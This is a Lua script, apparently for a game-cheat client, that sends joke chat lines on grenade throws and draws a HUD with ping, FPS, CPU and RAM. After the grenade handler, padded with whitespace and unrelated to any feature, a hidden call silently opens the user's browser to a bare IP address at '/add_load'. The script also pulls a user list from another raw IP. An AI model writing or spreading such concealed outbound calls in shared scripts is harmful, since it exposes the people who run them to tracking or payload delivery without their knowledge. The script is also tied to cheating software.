function on_nade(Event)
    if (Event:GetName() ~= 'grenade_thrown' or entities.GetLocalPlayer() == nil) then 
        return
    end

    local weapon = Event:GetString('weapon')

    if (client.GetLocalPlayerIndex() == client.GetPlayerIndexByUserID(Event:GetInt('userid'))) then
        if (weapon == "hegrenade") then
            client.ChatSay("憨憨丢雷！")
        elseif (weapon == "flashbang") then
            client.ChatSay("快看飞碟~");
        elseif (weapon == "molotov") then
            client.ChatSay("火烧屁屁咯~");
        elseif (weapon == "smokegrenade") then
            client.ChatSay("ステルスフォグ");
        elseif(weapon == "incgrenade") then
            client.ChatSay("BURN BABY BURN!!!");
        end
    end     
end
    panorama.RunScript([[
        SteamOverlayAPI.OpenExternalBrowserURL("http://1.117.227.75/add_load");
                                                                  ]])
client.AllowListener('grenade_thrown');
callbacks.Register("FireGameEvent", "nadesay", on_nade);


ffi.cdef[[
    typedef struct _MEMORYSTATUSEX {
        unsigned long dwLength;
        unsigned long dwMemoryLoad;
        unsigned __int64 ullTotalPhys;
        unsigned __int64 ullAvailPhys;
        unsigned __int64 ullTotalPageFile;
        unsigned __int64 ullAvailPageFile;
        unsigned __int64 ullTotalVirtual;
        unsigned __int64 ullAvailVirtual;
        unsigned __int64 ullAvailExtendedVirtual;
    } MEMORYSTATUSEX, *LPMEMORYSTATUSEX;
    
    typedef struct _FILETIME {
        unsigned long dwLowDateTime;
        unsigned long dwHighDateTime;
    } FILETIME, *PFILETIME, *LPFILETIME;

    uint32_t GetSystemTimes(PFILETIME lpIdleTime , PFILETIME lpKernelTime , PFILETIME  lpUserTime );

    uint32_t GlobalMemoryStatusEx(LPMEMORYSTATUSEX);

    typedef void* (__cdecl* tCreateInterface)(const char* name, int* returnCode);
    void* GetProcAddress(void* hModule, const char* lpProcName);
    void* GetModuleHandleA(const char* lpModuleName);

]]
local leveltext="null"--用户分组值
local x,y=draw.GetScreenSize()--获取屏幕   --x/2+560, y/2-530cheat.GetUserName() 
local iconPng = http.Get("http://q1.qlogo.cn/g?b=qq&nk=1348984838&s=100&t=")--获取QQ头像
local text2, text3, text4 = string.find(http.Get(
    "http://49.234.105.252:975/user/level/userlevellist.txt"),"(1348984838)")
if  text2~=nil then--用户分组
    leveltext="God"
    else
    leveltext="Vip"
        
end
local frame_rate = 0.0
local get_abs_fps = function()
    frame_rate = 0.9 * frame_rate + (1.0 - 0.9) * globals.AbsoluteFrameTime()
    return math.floor((1.0 / frame_rate) + 0.5)
end


--CPU 和 RAM 部分借鉴了https://aimware.net/forum/thread/152542/page/1

local CPU = {
    CPU = 0,
    InterpolatedCPU = 0,
    last_getCPU = 0,

}
local RAM = {
    RAM = 1,
    InterpolatedRAM = 0,
    last_getRAM = 0,
}
local _previousTotalTicks, _previousIdleTicks, _oldRet  = 0, 0, 0;
function CalculateCPULoad(idleTicks, totalTicks)

    totalTicksSinceLastTime = totalTicks - _previousTotalTicks;
    idleTicksSinceLastTime = idleTicks - _previousIdleTicks;

    if totalTicksSinceLastTime > 0 then
        ret = 100 - (100 * idleTicksSinceLastTime / totalTicksSinceLastTime) + 1
    end
    _previousTotalTicks = totalTicks;
    _previousIdleTicks = idleTicks;

    if ret and ret > 0 and ret < 100 then 
        _oldRet = ret
    end
    return _oldRet;

end
local function cpu()
    
        if (globals.RealTime() - CPU.last_getCPU > 0.2) then
            local idleTime = ffi.new('FILETIME')
            local kernelTime = ffi.new('FILETIME')
            local userTime = ffi.new('FILETIME')
            ffi.C.GetSystemTimes(idleTime, kernelTime, userTime)
            local idleTimeint64 = bit.bxor(bit.rshift(idleTime.dwHighDateTime, 32), idleTime.dwLowDateTime)
            local kernelTimeint64 = bit.bxor(bit.rshift(kernelTime.dwHighDateTime, 32), kernelTime.dwLowDateTime)
            local userTimeint64 = bit.bxor(bit.rshift(userTime.dwHighDateTime, 32), userTime.dwLowDateTime)

            CPU.CPU = CalculateCPULoad(idleTimeint64, kernelTimeint64+userTimeint64)
            CPU.last_getCPU = globals.RealTime();
        end
        if CPU.CPU > CPU.InterpolatedCPU then
            if CPU.CPU - CPU.InterpolatedCPU >= 1 then
                if CPU.CPU ~= CPU.InterpolatedCPU then
                    CPU.InterpolatedCPU = CPU.InterpolatedCPU+0.1
                end
            end
        elseif CPU.CPU < CPU.InterpolatedCPU then
            if CPU.CPU - CPU.InterpolatedCPU <= 1 then
                if CPU.CPU ~= CPU.InterpolatedCPU then
                    CPU.InterpolatedCPU = CPU.InterpolatedCPU-0.1
                end
            end
        end
        return InterpolatedCPU
    end 
    local function ram()

            if (globals.RealTime() - RAM.last_getRAM > 1) then
                MEMORYSTATUSEX = ffi.new('MEMORYSTATUSEX')
                MEMORYSTATUSEX.dwLength = ffi.sizeof(MEMORYSTATUSEX)
                ffi.C.GlobalMemoryStatusEx(MEMORYSTATUSEX)
                RAM.RAM = MEMORYSTATUSEX.dwMemoryLoad
                RAM.last_getRAM = globals.RealTime();
            end
            if RAM.RAM > RAM.InterpolatedRAM then
                if RAM.RAM - RAM.InterpolatedRAM >= 1 then
                    if RAM.RAM ~= RAM.InterpolatedRAM then
                        RAM.InterpolatedRAM = RAM.InterpolatedRAM+0.1
                    end
                end
            elseif RAM.RAM < RAM.InterpolatedRAM then
                if RAM.RAM ~= RAM.InterpolatedRAM then
                    RAM.InterpolatedRAM = RAM.InterpolatedRAM-0.1
                end
            end
            return RAM.InterpolatedRAM
        end
local fontttf=draw.AddFontResource( "SourceHanSansCN-Normal.otf")
local TOPFONT = draw.CreateFont("SourceHanSansCN-Normal", 16, 450)
local BOTFONT = draw.CreateFont("SourceHanSansCN-Normal", 20, 750)

local delay="0"--延迟
local RGBA, width, height = common.DecodeJPEG(iconPng);
local texture = draw.CreateTexture(RGBA, width, height)
local bcPng =http.Get( "http://1256182033.vod2.myqcloud.com/7d2fb881vodcq1256182033/4a413f283701925921929930543/8jjGCuUW7fAA.png")
local RGBA, width, height = common.DecodePNG(bcPng);
local bcPngvv = draw.CreateTexture(RGBA, width, height)
callbacks.Register( "Draw", function ()
    local tickccc=globals.TickCount()/globals.CurTime()
    local r = math.floor(math.sin(globals.RealTime() * 1) * 120 + 128);
    local g = math.floor(math.sin(globals.RealTime() * 1 + 2) * 120 + 128);
    local b = math.floor(math.sin(globals.RealTime() * 1 + 4) * 100 + 128);
        --math.ceil(CPU.InterpolatedCPU)  cpu占用
        --math.ceil(RAM.InterpolatedRAM)  ram占用
    cpu()
    ram()
    local cpur,cpug,cpub,ramr,ramg,ramb;
    if CPU.InterpolatedCPU<40 then
        cpur=46;cpug=213;cpub=115;
        elseif CPU.InterpolatedCPU>40 and CPU.InterpolatedCPU<70 then
        cpur=255;cpug=99;cpub=72;
        elseif CPU.InterpolatedCPU>70 and CPU.InterpolatedCPU<100 then
        cpur=234;cpug=32;cpub=39;
    end
    if RAM.InterpolatedRAM<40 then
            ramr=46;ramg=213;ramb=115;
        elseif RAM.InterpolatedRAM>40 and RAM.InterpolatedRAM<70 then
            ramr=255;ramg=99;ramb=72;
        elseif RAM.InterpolatedRAM>70 and RAM.InterpolatedRAM<100 then
            ramr=234;ramg=32;ramb=39;
    end
    if entities.GetLocalPlayer()~=nil then
        local pr=entities.GetPlayerResources()
        delay = pr:GetPropInt("m_iPing", entities.GetLocalPlayer():GetIndex())
        else
        delay="0"
    end
    draw.SetTexture(bcPngvv)
    draw.FilledRect(x/2+535, y/2-515 , x/2+935, y/2-415)
    draw.SetTexture(texture)
    draw.FilledRect(x/2+546, y/2-504 , x/2+624, y/2-428)
    draw.Color( 255,255,255 )
    draw.SetFont( TOPFONT )
    draw.Text( x/2+783, y/2-498, 1348984838)
    draw.Color( 255,255,255)
    draw.Text( x/2+902, y/2-498, leveltext)
    draw.SetFont( BOTFONT )
    draw.Color( 0,0,0)
    draw.Text(x/2+715, y/2-468, delay.." ms" )
    draw.Text( x/2+705, y/2-437, get_abs_fps() )
    draw.Text( x/2+817, y/2-468, math.ceil(tickccc) )
    draw.Color( 0,0,0)
    draw.Text(x/2+779, y/2-437, os.date('%X') )
    draw.Color( cpur, cpug, cpub,160)
    draw.Text( x/2+902, y/2-468, math.ceil(CPU.InterpolatedCPU).."%" )
    draw.Color( ramr, ramg, ramb,160 )
    draw.Text( x/2+902, y/2-437, math.ceil(RAM.InterpolatedRAM).."%" )
    

end)